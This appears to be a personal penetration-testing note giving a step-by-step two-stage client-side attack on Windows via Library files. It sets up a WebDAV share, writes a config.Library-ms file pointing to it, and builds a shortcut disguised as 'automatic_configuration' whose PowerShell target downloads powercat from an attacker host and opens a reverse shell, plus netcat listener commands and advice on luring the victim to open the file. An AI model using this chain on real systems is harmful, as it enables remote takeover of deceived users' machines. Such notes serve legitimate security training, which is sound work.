---
title: Code Execution via Window Library Files
updated: 2025-04-23 13:30:36Z
created: 2025-04-23 05:08:45Z
latitude: -33.78668940
longitude: 150.95264980
altitude: 0.0000
---

## Leverage a 2-stage Client-side attack
**Stage 1**: Use **Windows Library Files** to gain a foothold on the target system and setup the next stage.
**Stage 2:** Use the foothold to provide an executable file that will start a **reverse shell** when clicked.

1. Create folder and setup a a share for **WebDav**
`mkdir /home/kali/servers/webdav`
`wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/servers/webdav`

2. Use VS Studio Code to create a windows library file, save as:
**File name:**`config.Library-ms`
**Save as type:** Plain Text
```
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>1</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://x.x.x.x</url> 
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```

3. Create a **shortcut** file
The goal is to start a reverse shell by putting the shortcut file on the **WebDav** share for the victim to execute.
**Name**: `automatic_configuration`
**Target**: `powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<evil>/powercat.ps1');powercat -c <evil> -p <port> -e powershell"`

4. Start WebServer and Netcat listener:
`cd /usr/share/powershell-empire/empire/server/data/module_source/management`
`python3 -m http.server 80`
`nc -nvlp <port>`

5. Launch the **config** file to connect to the WebDav share, and upload the files:
`automatic_configuration`
`config` (`config.Library-ms`)

6. Now try to get the target to execute the `config` file
Can use via Macro, SMBShare